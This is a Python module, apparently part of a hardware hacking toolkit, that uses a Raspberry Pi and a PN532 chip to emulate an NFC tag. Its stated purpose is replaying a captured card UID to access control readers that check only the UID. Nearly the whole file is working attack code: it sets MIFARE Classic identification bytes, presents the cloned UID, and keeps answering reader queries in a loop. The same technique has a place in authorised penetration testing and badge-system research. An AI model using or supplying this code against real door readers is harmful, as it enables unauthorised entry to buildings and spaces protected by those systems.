# modules/nfc/emulate.py
# Emulate an NFC tag using PN532 over I2C.
#
# PN532 supports card emulation in ISO14443-3A mode (Type A).
# This makes the Pi + PN532 appear as an NFC tag to any reader.
#
# Use case: replay a captured UID to an access control reader.
#
# Note: PN532 emulation is limited — it presents the UID and responds
# to basic anticollision, but won't emulate full MIFARE crypto.
# For access control systems that only check the UID (most cheap ones),
# this is enough.

import time

_running = False

def stop():
    global _running
    _running = False


def _init_pn532(log):
    try:
        import board, busio
        from adafruit_pn532.i2c import PN532_I2C
        i2c   = busio.I2C(board.SCL, board.SDA)
        pn532 = PN532_I2C(i2c, debug=False, address=0x28)
        pn532.SAM_configuration()
        ic, ver, rev, _ = pn532.firmware_version
        log(f"[*] PN532 ready — firmware v{ver}.{rev}")
        return pn532
    except ImportError:
        log("[ERROR] Run: pip install adafruit-circuitpython-pn532 adafruit-blinka")
        return None
    except Exception as e:
        log(f"[ERROR] PN532 init: {e}")
        return None


def run(log=print, uid="04AABBCC", tag_type="MIFARE"):
    """
    Emulate an NFC tag until stopped.
    uid:      UID to emulate as hex string (4 or 7 bytes)
              e.g. "04AABBCC" or "04:AA:BB:CC:DD:EE:FF"
    tag_type: "MIFARE" or "ISO14443A"
    """
    global _running

    pn532 = _init_pn532(log)
    if not pn532:
        return

    # Parse UID
    uid_clean = uid.replace(":", "").replace(" ", "")
    try:
        uid_bytes = bytes.fromhex(uid_clean)
    except ValueError:
        log(f"[ERROR] Invalid UID: {uid}. Use hex like 04AABBCC")
        return

    if len(uid_bytes) not in (4, 7):
        log(f"[ERROR] UID must be 4 or 7 bytes, got {len(uid_bytes)}")
        return

    uid_hex = ":".join(f"{b:02X}" for b in uid_bytes)
    log(f"[*] Emulating UID : {uid_hex}")
    log(f"[*] Tag type      : {tag_type}")
    log(f"[*] Presenting to readers — press STOP to end.")

    # PN532 tgInitAsTarget command
    # Sets the module to listen as a card
    # ATQA and SAK bytes identify the card type to readers
    # MIFARE Classic 1K: ATQA=0x0004, SAK=0x08
    ATQA = bytes([0x04, 0x00])
    SAK  = bytes([0x08])

    _running   = True
    read_count = 0

    try:
        while _running:
            try:
                # Attempt to init as target (card emulation)
                # timeout=1000ms — returns when a reader queries us
                response = pn532._call_function(
                    params=[
                        0x01,           # mode: ISO14443-3A passive
                        ATQA[1], ATQA[0],
                        SAK[0],
                        len(uid_bytes),
                        *uid_bytes,
                        0x00,           # historical bytes length
                    ],
                    command=0x8C,       # TgInitAsTarget
                    response_length=30,
                    timeout=1.0,
                )

                if response:
                    read_count += 1
                    log(f"[+] Reader query #{read_count} — UID presented successfully.")

                    # Respond to any APDU the reader sends
                    # For UID-only access systems this is enough
                    # Send empty response to keep reader happy
                    pn532._call_function(
                        params=[0x00] + [0x90, 0x00],
                        command=0x90,   # TgResponseToInitiator
                        response_length=1,
                        timeout=0.5,
                    )

            except Exception:
                # Reader went away or timeout — just keep looping
                time.sleep(0.1)

    finally:
        log(f"[*] Emulation stopped — presented UID {read_count} times.")
